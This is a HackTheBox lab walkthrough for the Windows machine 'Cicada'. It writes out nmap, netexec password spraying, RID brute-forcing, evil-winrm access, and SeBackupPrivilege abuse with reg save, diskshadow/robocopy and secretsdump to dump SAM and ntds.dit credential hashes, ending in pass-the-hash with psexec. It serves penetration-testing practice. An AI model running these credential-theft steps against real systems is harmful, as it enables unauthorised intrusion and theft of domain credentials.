2025
### NMAP

```
sudo nmap -sC -sV -vv -oN nmap-cicada 10.10.11.35
```
### Enumerate for Initial Access

#### netexec
Try guest authentication
```
nxc smb 10.10.11.35 -u '.' -p '' --shares
```

![[HackTheBox/Windows Active Directory/attachments/Pasted image 20250525235539.png]]
- see we can READ the HR share 

#### smbclient to read the share
```
smbclient -U '.' //10.10.11.35/HR
```

![[HackTheBox/Windows Active Directory/attachments/Pasted image 20250525235700.png]]

get the file and read to reveal default password
![[HackTheBox/Windows Active Directory/attachments/Pasted image 20250525235817.png]]

but we need to figure out users..

#### netexec rid brute to get user listing
```
nxc smb 10.10.11.35 -u '.' -p '' --rid-brute
```
![[HackTheBox/Windows Active Directory/attachments/Pasted image 20250526000149.png]]

Copy the output and save to users.txt file.

#### Netexec: Password Spraying

```
nxc smb 10.10.11.35 -u users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8'
```

![[HackTheBox/Windows Active Directory/attachments/Pasted image 20250526000525.png]]
- we get a valid user + pass combo

Use this valid user + pass combo to list users in the domain
#### Netexec: List Users
```
nxc smb -u 'michael.w' -p 'Cicada$M6Corpb*@Lp#nZp!8' --users
```

![[HackTheBox/Windows Active Directory/attachments/Pasted image 20250526000806.png]]
- got another user + pass in description

Enumerate smb shares again with david's creds and he can read the dev share :) 
![[HackTheBox/Windows Active Directory/attachments/Pasted image 20250526000936.png]]

#### SMBClient again to read dev share 
![[HackTheBox/Windows Active Directory/attachments/Pasted image 20250526001026.png]]
- get backup_script.ps1

Checking out this script and get emily's password 

![[HackTheBox/Windows Active Directory/attachments/Pasted image 20250526001444.png]]

Try this password with netexec
![[HackTheBox/Windows Active Directory/attachments/Pasted image 20250526001554.png]]
- emily isn't and admin, but has READ,WRITE in C$ share

Look at C$ using smbclient
![[HackTheBox/Windows Active Directory/attachments/Pasted image 20250526001712.png]]

Test emily's creds against winrm

![[HackTheBox/Windows Active Directory/attachments/Pasted image 20250526001815.png]]
- we can login using evil-winrm
### Initial Access

#### evil-winrm
![[HackTheBox/Windows Active Directory/attachments/Pasted image 20250526001911.png]]

### Enumerate for Priv Esc 
```
whoami /all
```

![[HackTheBox/Windows Active Directory/attachments/Pasted image 20250526001957.png]]
- we got SeBackupPrivilege and SeRestorePrivilege

We can abuse **SeBackupPrivileges** using `reg save`

### Priv Esc

#### reg save sam and system archives

```
reg save HKLM\SAM SAM
```

```
reg save HKLM\SYSTEM SYSTEM
```

![[HackTheBox/Windows Active Directory/attachments/Pasted image 20250526002509.png]]

download these files 

```
download sam
```

```
download system
```

![[HackTheBox/Windows Active Directory/attachments/Pasted image 20250526002612.png]]

The run secretsdump to get the SAM hash for the Administrator
```
secretsdump.py local -sam sam -system system
```

![[HackTheBox/Windows Active Directory/attachments/Pasted image 20250526003605.png]]
- we get administrator's hash 

Test this hash using netexec and it shows pwn3d!
![[HackTheBox/Windows Active Directory/attachments/Pasted image 20250526003831.png]]

Then we know we can use psexec to login as admin
```
psexec.py -hashes <ADMIN HASH> administrator@10.10.11.35
```
![[HackTheBox/Windows Active Directory/attachments/Pasted image 20250526003959.png]]
⭐got root⭐

### Alternate SeBackupPrivilege Abuse - Saving ntds.dit via RoboCopy

If this is an AD machine, then ntds.dit will be where all the creds are stored (not the sam files)

[Reference](https://infosecwriteups.com/elevating-privileges-with-sebackupprivilege-on-windows-107bd34befa2)

Here is the full script (from above linked blogpost) that performs full backup of the C: drive and exposes it as network drive E:

Save this to a file called `diskshadow.txt`
```
set verbose on  
set metadata C:\Windows\Temp\meta.cab  
set context clientaccessible  
set context persistent  
begin backup  
add volume C: alias cdrive  
create  
expose %cdrive% E:  
end backup
```

Convert this file to dos 

```
unix2dos diskshadow.txt
```

![[HackTheBox/Windows Active Directory/attachments/Pasted image 20250526004314.png]]

Upload this file to evil-winrm shell 

![[HackTheBox/Windows Active Directory/attachments/Pasted image 20250526004416.png]]

Then run 
![[HackTheBox/Windows Active Directory/attachments/Pasted image 20250526004447.png]]

Then run the **robocopy** command 
![[HackTheBox/Windows Active Directory/attachments/Pasted image 20250526004558.png]]

Now we have the **ntds.dit** file 
![[HackTheBox/Windows Active Directory/attachments/Pasted image 20250526004629.png]]

Download this ntds.dit file 

Use **secretsdump.py** to dump the ntds.dit goodies

```
secretsdump.py local -system system -ntds ntds.dit 
```

![[HackTheBox/Windows Active Directory/attachments/Pasted image 20250526004844.png]]

![[HackTheBox/Windows Active Directory/attachments/Pasted image 20250526005122.png]]

